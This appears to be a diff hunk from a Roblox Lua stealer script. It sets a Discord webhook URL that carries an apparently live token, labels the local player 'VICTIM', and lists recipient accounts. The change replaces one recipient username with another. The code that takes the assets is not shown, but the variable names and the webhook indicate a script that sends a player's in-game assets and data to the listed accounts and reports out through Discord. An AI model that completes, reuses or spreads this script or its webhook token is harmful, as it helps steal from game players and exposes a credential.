@@ -24,7 +24,7 @@ _G.scriptExecuted = true
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "sshhshs",
+    "saikigrow",
     "yuniecoxo",
     "Wanwood42093"
 }
